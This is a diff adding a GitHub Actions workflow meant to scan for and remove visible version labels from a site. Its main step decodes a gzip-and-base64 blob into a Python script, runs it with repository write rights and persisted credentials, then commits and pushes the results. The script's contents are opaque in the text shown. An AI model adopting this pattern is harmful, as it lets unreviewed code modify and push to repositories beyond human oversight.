@@ -1,0 +1,75 @@
+name: WAV ARCHIVE - Clean Visible Version Labels
+
+on:
+  workflow_dispatch:
+    inputs:
+      operation:
+        description: "Audit first, then apply, or rollback"
+        required: true
+        default: audit
+        type: choice
+        options:
+          - audit
+          - apply
+          - rollback
+
+permissions:
+  contents: write
+
+concurrency:
+  group: wav-visible-label-cleanup-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  cleanup:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - name: Checkout current site (preserve all existing systems)
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: true
+
+      - name: Restore checksum-free self-contained installer
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PYRUN'
+          import base64,gzip,os,pathlib
+          code = "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"
+          raw = gzip.decompress(base64.b64decode(code))
+          pathlib.Path(os.environ['RUNNER_TEMP'],'wav_visible_copy_cleanup.py').write_bytes(raw)
+          PYRUN
+          python3 -m py_compile "$RUNNER_TEMP/wav_visible_copy_cleanup.py"
+
+      - name: Scan or clean visible developer version labels (offline only)
+        shell: bash
+        env:
+          OPERATION: ${{ inputs.operation }}
+        run: |
+          set -euo pipefail
+          python3 "$RUNNER_TEMP/wav_visible_copy_cleanup.py" \
+            --root "$GITHUB_WORKSPACE" \
+            --operation "$OPERATION" \
+            --changed-files "$RUNNER_TEMP/wav_visible_copy_changed.txt"
+
+      - name: Commit only UI files changed by cleanup
+        if: ${{ inputs.operation != 'audit' }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          while IFS= read -r path; do
+            if [ -n "$path" ]; then
+              git add -A -- "$path"
+            fi
+          done < "$RUNNER_TEMP/wav_visible_copy_changed.txt"
+          if git diff --cached --quiet; then
+            echo "No updates: already installed, already reverted or no matching labels"
+            exit 0
+          fi
+          git diff --cached --check
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git commit -m "Clean public-facing developer version labels"
+          git push origin "HEAD:${GITHUB_REF_NAME}"
